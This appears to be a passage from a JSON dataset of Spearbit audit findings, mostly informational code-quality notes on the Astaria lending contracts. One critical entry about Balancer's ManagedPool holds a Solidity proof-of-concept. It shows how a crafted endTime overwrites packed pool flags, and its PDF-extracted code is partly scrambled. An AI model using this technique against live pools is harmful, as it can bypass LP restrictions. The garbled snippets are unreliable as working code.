        "title": "Use modifier",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "Highlighted code have require checks on msg.sender which can be converted to modifiers. For instance: require(address(msg.sender) == s.guardian);",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "Prefer SafeCastLib for typecasting",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "Highlighted code above does typecasting of several constant values. In case, some value doesn't fit in the type, this typecasting will silently ignore the higher order bits although that's currently not the case, but it may pose a risk if these values are changed in future.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "Rename Multicall to Multidelegatecall",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "Multicall.sol lets performs multiple delegatecalls. Hence, the name Multicall is not suitable. The contract and the file should be named Multidelegatecall.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "safeTransferFrom() without the data argument can be used",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "Highlighted code above sends empty data over an external call via ERC721.safeTransferFrom(from, to, tokenId, data): IERC721(underlyingAsset).safeTransferFrom( address(this), releaseTo, assetId, \"\" ); data can be removed since ERC721.safeTransferFrom(from, to, tokenId) sets empty data too.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "Fix documentation that updateVaultAfterLiquidation can be called by LIEN_TOKEN, not ROUTER",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "The function has the correct validation that it can only be called by LIEN_TOKEN(), but the comment says it can only be called by ROUTER(). require(msg.sender == address(LIEN_TOKEN())); // can only be called by router",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "Declare event and constants at the beginning",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "Events and constants are generally declared at the beginning of a smart contract. However, for the highlighted code above, that's not the case.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "Rename Vault to PrivateVault",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "Vault contract is used to represent private vaults.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "Remove comment",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "Comment at line WithdrawProxy.sol#L229 can be removed: if ( block.timestamp < s.finalAuctionEnd // || s.finalAuctionEnd == uint256(0) ) { The condition in comments is always false as the code already reverts in that case.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "WithdrawProxy and PrivateVault symbols are missing hyphens",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "The symbol for the WithdrawProxy token is missing a hyphen after the W, which will make the name AST-W0x... instead of AST-W-0x.... Similarly, the symbol for the Private Vault token (in Vault.sol) is missing a hyphen after the V.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "Lien cannot be bought out after stack.point.end",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "The _getRemainingInterest function reverts with Panic(0x11) when block.timestamp > stack.point.end.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "Inconsistent strictness of inequalities in isValidRefinance",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "In isValidRefinance, we check that either: a) newRate < maxNewRate && newEnd >= oldEnd b) newEnd - oldEnd >= minDurationIncrease && newRate <= oldRate We should be consistent in whether we're enforcing the changes are strict inequalities or non-strict inequalities.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "Clarify comments",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "Few comments are not clear on what they are referring to: zone: address(this), // 0x20 ... conduitKey: s.CONDUIT_KEY, // 0x120",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "Remove unused files",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "CallUtils.sol is not used anywhere in the codebase.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "Document privileges and entities holding these privileges",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "There are certain privileged functionalities in the codebase (recognized through requiresAuth mod- ifier). Currently, we have to refer to tests to identify the setup.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "Document and ensure that maximum number of liens should not be set greater than 256",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "Maximum number of liens in a stack is currently set to 5. While paying for a lien, the index in the stack is casted to uint8. This makes the implicit limit on maximum number of liens to be 256.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "transferWithdrawReserve() can return early when the current epoch is 0",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "If s.currentEpoch == 0, s.currentEpoch - 1 will wrap around to type(uint256).max and we will most probably will drain assets into address(0) in the following block: unchecked { s.withdrawReserve -= WithdrawProxy(withdrawProxy) .drain( s.withdrawReserve, s.epochData[s.currentEpoch - 1].withdrawProxy ) .safeCastTo88(); } But this cannot happen since in the outer if block the condition s.withdrawReserve > 0 indirectly means that s.currentEpoch > 0. The indirect implication above regarding the 2 conditions stems from the fact that s.withdrawReserve has only been set in transferWithdrawReserve() function or processEpoch(). In transferWithdrawReserve() function 78 it assumes a positive value only when s.currentEpoch > uint64(0) and in processEpoch() at the end we are incrementing s.currentEpoch.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "2 of the inner if blocks of processEpoch() check for a condition that has already been checked by an outer if block",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "The following 2 if block checks are redundant: if (address(currentWithdrawProxy) != address(0)) { currentWithdrawProxy.setWithdrawRatio(s.liquidationWithdrawRatio); } uint256 expected = 0; if (address(currentWithdrawProxy) != address(0)) { expected = currentWithdrawProxy.getExpected(); } Since the condition address(currentWithdrawProxy) != address(0) has already been checked by an outer if block.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "General formatting suggestions",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": " PublicVault.sol#L283 : there are extra sourounding paranthesis",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "Identical collateral check is performed twice in _createLien",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "In _createLien, a check is performed that the collateralId of the new lien matches the collateralId of the first lien on the stack. if (params.stack.length > 0) { if (params.lien.collateralId != params.stack[0].lien.collateralId) { revert InvalidState(InvalidStates.COLLATERAL_MISMATCH); } } This identical check is performed twice (L383-387 and L389-393).",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "checkAllowlistAndDepositCap modifer can be defined to consolidate some of the mint and deposit logic for public vaults",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "The following code snippet has been used for both mint and deposit endpoints of a public vault: VIData storage s = _loadVISlot(); if (s.allowListEnabled) { require(s.allowList[receiver]); } uint256 assets = totalAssets(); if (s.depositCap != 0 && assets >= s.depositCap) { revert InvalidState(InvalidStates.DEPOSIT_CAP_EXCEEDED); }",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "Document why bytes4(0xffffffff) is chosen when CollateralToken acting as a Seaport zone to signal invalid orders",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "bytes4(0xffffffff) to indicate a Seaport order using this zone is not a valid order.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "CollateralToken.onERC721Received's use of depositFor stack variable is redundant",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "If we follow the logic of assigning values to depositFor in CollateralToken.onERC721Received, we notice that it will end up being from_. So its usage is redundant.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "onlyOwner modifier can be defined to simplify the codebase",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "releaseToAddress checks whether the msg.sender is an owner of a collateral. CollateralToken already has a modifier onlyOwner(...), so the initial check in releaseToAddress can be delegated to the modifier.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "Document liquidator's role for the protocol",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "When a lien's term end (stack.point.end <= block.timestamp), anyone can call the liquidate on AstariaRouter. There is no restriction on the msg.sender. The msg.sender will be set as the liquidator and if:  The Seaport auction ends (3 days currently, set by the protocol), they can call liquidatorNFTClaim to claim the NFT.  Or if the Seaport auction settles, the liquidator receives the liquidation fee.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "Until ASTARIA_ROUTER gets filed for CollateralToken, CollateralToken can not receive ERC721s safely.",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "ASTARIA_ROUTER is not set in the CollateralToken's constructor. So till an entity with an author- ity would file for it, CollateralToken is unable to safely receive an ERC721 token ( whenNotPaused and on- ERC721Received would revert).",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "_getMaxPotentialDebtForCollateral might have meant to be an internal function",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "_getMaxPotentialDebtForCollateral is defined as a public function. underscore which as a convention usually is used for internal or private functions.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "return keyword can be removed from stopLiens",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "_stopLiens does not return any values but in stopLiens the return statement is used along with the non-existent return value of _stopLiens.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "LienToken's constructor does not set ASTARIA_ROUTER which makes some of the endpoints unfunc- tional",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "LienToken's constructor does not set ASTARIA_ROUTER. That means till an authorized entity calls file to set this parameter, the following functions would be broken/revert:  buyoutLien  _buyoutLien  _payDebt  getBuyout  _getBuyout  _isPublicVault  setPayee, partially broken  _paymentAH  payDebtViaClearingHouse",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "Document the approval process for a user's CollateralToken before calling commitToLiens",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "In the _executeCommitment's return statement: IVaultImplementation(c.lienRequest.strategy.vault).commitToLien( c, address(this) ); address(this) is the AstariaRouter. The call here to commitToLien enters into _validateCommitment with AstariaRouter as the receiver and so for it to no revert, the holder would have needed to set the approval for the router previously/beforehand: CT.isApprovedForAll(holder, receiver) // needs to be true 83",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "isValidRefinance's return statement can be reformatted",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "Currently, it is a bit hard to read the return statement of isValidRefinance.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "Withdraw Reserves should always be transferred before Commit to Lien",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "When a new lien is requested, the _beforeCommitToLien() function is called. If the epoch is over, this calls processEpoch(). Otherwise, it calls transferWithdrawReserve(). function _beforeCommitToLien( IAstariaRouter.Commitment calldata params, address receiver ) internal virtual override(VaultImplementation) { VaultData storage s = _loadStorageSlot(); if (timeToEpochEnd() == uint256(0)) { processEpoch(); } else if (s.withdrawReserve > uint256(0)) { transferWithdrawReserve(); } } However, the processEpoch() function will fail if the withdraw reserves haven't been transferred. In this case, it would require the user to manually call transferWithdrawReserve() to fix things, and then request their lien again. Instead, the protocol should transfer the reserves whenever it is needed, and only then call processEpoch().",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "Remove owner() variable from withdraw proxies",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "When a withdrawProxy is deployed, it is created with certain immutable arguments. Two of these values are owner() and vault(), and they will always be equal. They seem to be used interchangeably on the withdraw proxy itself, so should be consolidated into one variable.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "Unnecessary checks in _validateCommitment",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "In _validateCommitment(), we check to confirm that either the sender of the message is adequately qualified to be making the decision to take a lien against the collateral (ie they are the holder, the operator, etc). However, the way this is checked is somewhat roundabout and can be substantially simplified. For example, we check require(operator == receiver); in a block that is only triggered if we've already validated that receiver != operator.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "Comment or remove unused function parameters",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "Highlighted functions above take arguments which are never used. particular signature, comment that argument name, otherwise remove that argument completely. If the function has to have a Additional instances noted in Context above.  LienToken.sol#L726 : LienStorage storage s input parameter is not used in _getRemainingInterest. It can be removed and this function can be pure.  VaultImplementation.sol#L341 : incoming is not used buyoutLien, was this variable meant to be used?",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "Zero address check can never fail",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "The details.borrower != address(0) check will never be false in the current system as AstariaRouter.sol#L352-L354 will revert when ownerOf is address(0).",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "UX differs between Router.commitToLiens and VaultImplementation.commitToLien",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "The Router function creates the Collateralized Token while the VaultImplementation requires the collateral owner to ERC721.safeTransferFrom to the CollateralToken contract prior to calling.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "Document what vaults are listed by Astaria",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "Anyone can call newPublicVault with epochLength in the correct range to create a public vault.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "Simplify nested if/else blocks in for loops",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "There are quite a few instances that nested if/else blocks are used in for loops and that is the only block in the for loop. 87 for ( ... ) { if (<CONDITION>) { ... } if else (<CONDITION>) { ... } ... if else (<CONDITION>) { ... } else { revert CustomError(); } }",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "Document the role guardian plays in the protocol",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "The role of guardian is not documented.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "strategistFee... have not been used can be removed from the codebase.",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "strategistFeeNumerator and strategistFeeDenominator are not used except in getStrategist- Fee (which itself also has not been referred to by other contracts). It looks like these have been replaced by the vault fee which gets set by public vault owners when they create the vault.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "redeemFutureEpoch can be called directly from a public vault to avoid using the endpoint from AstariaRouter",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "One can call the redeemFutureEpoch endpoint of the vault directly to avoid the extra gas of juggling assets and multiple contract calls when using the endpoint from AstariaRouter.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "Remove unused imports",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "If an imported file is not used, it can be removed.  LienToken.sol#L24 : since Base64 is only imported in this file, if not used it can be removed from the code- base.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "Reduce nesting by reverting early",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "Code following this pattern: if (<CONDITION>) { <BODY> } else { revert(); } can be simplified to remove nesting using custom errors: if (!<CONDITION>) { revert(); } <BODY> or if using require statements, it can be transformed into: require(<CONDITION>) <BODY>",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "assembly can read constant global variables",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "Yul cannot read global variables, but that is not true for a constant variable as its value is embedded in the bytecode. For instance, highlighted code above have the following pattern: bytes32 slot = WITHDRAW_PROXY_SLOT; assembly { s.slot := slot } Here, WITHDRAW_PROXY_SLOT is a constant which can be used directly in assembly code.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "Revert with error messages",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "There are many instances of require and revert statements being used without an accompanying error message. Error messages are useful for unit tests to ensure that a call reverted due the intended reason, and helps in identifying the root cause.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "Mixed use of require and revert",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "Astaria codebase uses a mix of require and revert statements. We suggest only following one of these ways to do conditional revert for standardization.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "tokenURI should revert on non-existing tokens",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "As per ERC721 standard, tokenURI() needs to revert if tokenId doesn't exist. The current code returns empty string for all inputs.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "Inheriting the same contract twice",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "VaultImplementation inherits from AstariaVaultBase (reference). Hence, there is no need to inherit AstariaVaultBase in Vault and PublicVault contract as they both inherit VaultImplementation already.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "No need to re-cast variables",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "Code above highlights redundant type castings. ERC721 CT = ERC721(address(COLLATERAL_TOKEN())); ... address(msg.sender) These type castings are casting variables to the same type.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "Comments do not match implementation",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": " Scenario 1 & 2: Comments note where each parameter ends in a packed byte array, or parameter width in bytes. The comments are outdated.  Scenario 3: The unless is not implemented.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "Incomplete Natspec",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": " LienToken.sol#L616 s, @return missing  LienToken.sol#L738-L750 s, position, @return missing  CollateralToken.sol#L616-L628 tokenId_ missing 93  VaultImplementation.sol#L153-L165 The second * on /** is missing causing the compiler to ignore the Natspec. The Natspec appears to document an old function interface. Params do not match with the function inputs.  VaultImplementation.sol#L298-L310 missing stack and return vaule  AstariaRouter.sol#L75-L77 @param NatSpec is missing for _WITHDRAW_IMPL, _BEACON_PROXY_IMPL and _- CLEARING_HOUSE_IMPL  AstariaRouter.sol#L44-L47 : Leave a comment that AstariaRouter also acts as an IBeacon for different cloned contracts.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "Cannot have multiple liens with same parameters",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "Lien Ids are computed by hashing the Lien struct itself. This means that no two liens can have the same parameters (e.g. same amount, rate, duration, etc.).",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "Redundant unchecked can be removed",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "There are no arithmetic operations in these unchecked blocks. For clarity, it can be removed.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational LienToken.sol#L264,"
        ]
    },
    {
        "title": "Argument name reuse with different meaning across contracts",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "ken.LienActionEncumber receiver is the lender (the receiver of the LienToken)",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "Licensing conflict on inherited dependencies",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "The version of Solmate contracts depended in tne gpl repository on are AGPL Licensed, making the gpl repository adopt the same license. This license is incompatible with the currently UNLICENSED Astaria related contracts.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "Important Balancer fields can be overwritten by EndTime",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf",
        "body": "Balancers ManagedPool uses 32 bit values for startTime and endTime but it does not verify if those values exist within that range. Values are stored in a 32-byte _miscData slot in BasePool via the insertUint32() function. Nevertheless, this function does not strip any excess bits, resulting in other fields stored in _miscData to be overwritten. In the version that Aera Vault uses only the \"restrict LP\" field can be overwritten and by carefully crafting the value of endTime, the \"restrict LP\" boolean can be switched off, allowing anyone to use joinPool. The Manager could cause this behavior via the updateWeightsGradually() function while the Owner could do it via enableTradingWithWeights(). Note: This issue has been reported to Balancer by the Spearbit team. contract ManagedPool is BaseWeightedPool, ReentrancyGuard { // f14de92ac443d6daf1f3a42025b1ecdb8918f22e 32 bits | 1 bit | | restrict LP | end time 32 bits | ] 7 bits | start time | total tokens | swap flag ] 1 bit | // [ 64 bits // [ reserved | // |MSB | 119 bits | unused function _startGradualWeightChange(uint256 startTime, uint256 endTime, ... ) ... { ... _setMiscData( _getMiscData().insertUint32(startTime, _START_TIME_OFFSET).insertUint32(endTime, ,! _END_TIME_OFFSET) ); // this convert the values to 32 bits ... } } In the latest version of ManagedPool many more fields can be overwritten, including:  LP flag  Fee end/Fee start  Swap flag contract ManagedPool is BaseWeightedPool, AumProtocolFeeCache, ReentrancyGuard { // current version // [ 64 bits ] // [ swap fee | LP flag | fee end | swap flag | fee start | end swap | end wgt | start wgt ] LSB| // |MSB 1 bit | 31 bits | | 31 bits 32 bits | 64 bits | 32 bits 1 bit | | The following POC shows how fields can be manipulated. // SPDX-License-Identifier: MIT pragma solidity ^0.8.13; import \"hardhat/console.sol\"; contract checkbalancer { uint256 private constant _MASK_1 = 2**(1) - 1; uint256 private constant _MASK_31 = 2**(31) - 1; uint256 private constant _MASK_32 = 2**(32) - 1; uint256 private constant _MASK_64 = 2**(64) - 1; uint256 private constant _MASK_192 = 2**(192) - 1; 5 | | 1 bit 64 bits | | 31 bits 1 bit | 31 bits | // [ 64 bits ] // [ swap fee | LP flag | fee end | swap flag | fee start | end swap | end wgt | start wgt ] LSB| // |MSB uint256 private constant _WEIGHT_START_TIME_OFFSET = 0; uint256 private constant _WEIGHT_END_TIME_OFFSET = 32; uint256 private constant _END_SWAP_FEE_PERCENTAGE_OFFSET = 64; uint256 private constant _FEE_START_TIME_OFFSET = 128; uint256 private constant _SWAP_ENABLED_OFFSET = 159; uint256 private constant _FEE_END_TIME_OFFSET = 160; uint256 private constant _MUST_ALLOWLIST_LPS_OFFSET = 191; uint256 private constant _SWAP_FEE_PERCENTAGE_OFFSET = 192; 32 bits | 32 bits function insertUint32(bytes32 word,uint256 value,uint256 offset) internal pure returns (bytes32) { bytes32 clearedWord = bytes32(uint256(word) & ~(_MASK_32 << offset)); return clearedWord | bytes32(value << offset); } function decodeUint31(bytes32 word, uint256 offset) internal pure returns (uint256) { return uint256(word >> offset) & _MASK_31; } function decodeUint32(bytes32 word, uint256 offset) internal pure returns (uint256) { return uint256(word >> offset) & _MASK_32; } function decodeUint64(bytes32 word, uint256 offset) internal pure returns (uint256) { return uint256(word >> offset) & _MASK_64; } function decodeBool(bytes32 word, uint256 offset) internal pure returns (bool) { return (uint256(word >> offset) & _MASK_1) == 1; } function insertBits192(bytes32 word,bytes32 value,uint256 offset) internal pure returns (bytes32) { bytes32 clearedWord = bytes32(uint256(word) & ~(_MASK_192 << offset)); return clearedWord | bytes32((uint256(value) & _MASK_192) << offset); } constructor() { bytes32 poolState; bytes32 miscData; uint startTime = 1 + 2*2**32; uint endTime = 3 + 4*2**32 + 5*2**(32+64) + 2**(32+64+31) + 6*2**(32+64+31+1) + ,! 2**(32+64+31+1+31) + 7*2**(32+64+31+1+31+1); poolState = insertUint32(poolState,startTime, _WEIGHT_START_TIME_OFFSET); poolState = insertUint32(poolState,endTime, _WEIGHT_END_TIME_OFFSET); miscData = insertBits192(miscData,poolState,0); decodeUint32(miscData, console.log(\"startTime\", console.log(\"endTime\", decodeUint32(miscData, console.log(\"endSwapFeePercentage\", decodeUint64(miscData, _WEIGHT_START_TIME_OFFSET)); // 1 // 3 _WEIGHT_END_TIME_OFFSET)); _END_SWAP_FEE_PERCENTAGE_OFFSET)); ,! // 4 console.log(\"Fee startTime\", console.log(\"Swap enabled\", console.log(\"Fee endTime\", console.log(\"AllowlistLP\", decodeUint31(miscData, decodeBool(miscData, decodeUint31(miscData, decodeBool(miscData, _FEE_START_TIME_OFFSET)); // 5 _SWAP_ENABLED_OFFSET)); // true _FEE_END_TIME_OFFSET)); // 6 _MUST_ALLOWLIST_LPS_OFFSET)); // ,! true console.log(\"Swap fee percentage\", console.log(\"Swap fee percentage\", decodeUint64(poolState, _SWAP_FEE_PERCENTAGE_OFFSET)); // 7 _SWAP_FEE_PERCENTAGE_OFFSET)); // 0 decodeUint64(miscData, due to miscData conversion } ,! }",
        "labels": [
            "Spearbit",
            "Gauntlet",
            "Severity: Critical Risk"
        ]
    },
    {
        "title": "sweep function should prevent Treasury from withdrawing pools BPTs",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf",
